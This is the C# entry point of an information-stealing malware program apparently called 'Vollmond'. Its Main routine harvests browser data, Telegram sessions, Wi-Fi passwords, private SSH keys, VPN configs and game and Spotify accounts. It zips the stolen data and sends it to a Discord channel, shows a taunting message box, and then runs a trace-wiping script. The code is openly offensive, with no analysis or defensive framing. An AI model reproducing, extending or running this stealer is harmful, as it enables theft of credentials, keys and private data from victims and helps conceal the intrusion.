using System.IO.Compression;
using Vollmond.Browsers;
using Vollmond.games;
using Vollmond.messengers;
using Vollmond.Minecraft;
using Vollmond.Streaming_platforms;
using Vollmond.VPN;

namespace Vollmond
{
    internal static class Program
    {
        public static string zipPath = Path.Combine(Path.GetTempPath(), $"{Environment.UserName}@{Environment.MachineName}.zip");
        /// <summary>
        ///  The main entry point for the application.
        /// </summary>
        [STAThread]
        static public async Task<int> Main()
        {
            if (Clear_Traces.TracesExists())
            {
                Clear_Traces.Clear_traces();
            }

            try
            {
                Directory.CreateDirectory(Path.Combine(Path.GetTempPath(), "Grabed_Data"));

                // Stealing data

                StealAllBrowsers.Steal();
                StealTelegram.StealSession();
                UTorrent.StealCurrentTorrents();
                Wifi_PWS.WifiPwStealer.Steal();
                GitAgent.Steal(); // Steal the private openssh keys
                GrabPotentiallyImportantFiles.grabPotentiallyImportantFiles();
                ProtonVPN.StealConnectionConfig(); // Makes a directory "VPN" (Nota Bene)
                Tlauncher.Steal(); // Makes a directory "Minecraft" (Nota bene)
                Spotify.Steal();
                //discord.Steal(); // You can comment this out later, as this operation consumes a significant amount of time and RAM (2 GB, 15 seconds).
                Steam.Steal(); // Makes a directory "games" (Nota bene)


                // Time to complete processes
                Thread.Sleep(5000);

                // Creating archive
                    ZipFile.CreateFromDirectory(
                        Path.Combine(Path.GetTempPath(), "Grabed_Data"),
                        zipPath,
                        CompressionLevel.SmallestSize,
                        false
                    );

                // Sending archive

                SendToDiscord.SendAsync().Wait();

                // Playing sound asynchronous, when archive is sendings and traces cleaning up
                if (URLs.is_need_sound == true)
                {
                    try
                    {
                        _ = Auxiliary.PlaysoundAsync("https://s2.deliciouspeaches.com/get/cuts/a2/fd/a2fd8b77225591004cd80deb4de9365d/47889160/In_Extremo_-_Vollmond_b128f0d239.mp3");

                        await Task.Run(() =>
                        {
                            MessageBox.Show("U are vollmonded muhaha", "In Extremo",
                                MessageBoxButtons.OK, MessageBoxIcon.Information,
                                MessageBoxDefaultButton.Button1,
                                MessageBoxOptions.ServiceNotification);
                        });
                    }
                    catch { }
                }
            }
            finally
            {
                // Removing files after user tap any button in messageBox
                try
                {
                    Clear_Traces.Clear_traces(); // Bat script what delete all traces and delete himself when ending work
                }
                catch { }

            }

            return 1;
        }
    }
}